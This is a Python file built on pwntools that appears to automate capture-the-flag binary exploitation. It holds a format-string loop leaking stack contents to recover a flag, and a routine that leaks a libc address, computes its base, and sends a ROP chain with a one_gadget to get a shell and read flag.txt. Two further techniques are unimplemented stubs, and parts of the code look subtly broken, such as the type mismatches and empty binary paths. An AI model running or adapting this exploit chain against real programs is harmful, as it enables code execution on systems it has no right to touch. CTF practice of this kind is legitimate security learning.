from typing import Optional
import re
from pwn import process, p64
import config as c


def stack_leak(vuln) -> Optional[str]:
    bin_path = ""
    start_pay = ""
    
    found_flag = False
    flag = ""
    for i in range(1000):
        p = process(bin_path)
        p.send(start_pay + f"%{i}$p")
        out = p.recv()
        comp = re.compile(c.pointer_re)
        srch = comp.search(out)
        if srch:
            text = bytes.fromhex(srch.group(1)).decode("ascii")[::-1]
            if "flag" in text:
                found_flag = True
            if found_flag:
                flag += text
            if "}" in text:
                break
    
    if found_flag:
        print(f"Flag found! {flag}")
    else:
        print("Could not find flag from leaking stack!")


def libc_leak(vuln) -> Optional[str]:
    bin_path = ""
    start_pay = ""

    for i in range(1000):
        p = process(bin_path)
        p.send(start_pay + f"%{i}$p")
        out = p.recv()
        comp = re.compile(c.pointer_re)
        srch = comp.search(out)
        if srch:
            address = int(srch.group(1), 16)
            leak_offset = 0x7ffff7e13d0a-0x7ffff7ded000
            libc_leak = address - leak_offset

            pop_r12 = 0x26e9a+libc_leak
            one_gadget = 0xcbd1a+libc_leak

            p = process(bin_path)
            p.send(start_pay + p64(pop_r12) + p64(0) + p64(one_gadget))
            p.send("cat flag.txt")
            ans = p.recvS()

            comp = re.compile(c.flag_re)
            srch = comp.search(ans)
            if srch:
                return srch.group(1)
    print("Failed to find flag from libc leak")


def write_prim(vuln) -> Optional[str]:
    return None # TODO


def got_overwrite(vuln) -> Optional[str]:
    return None # TODO
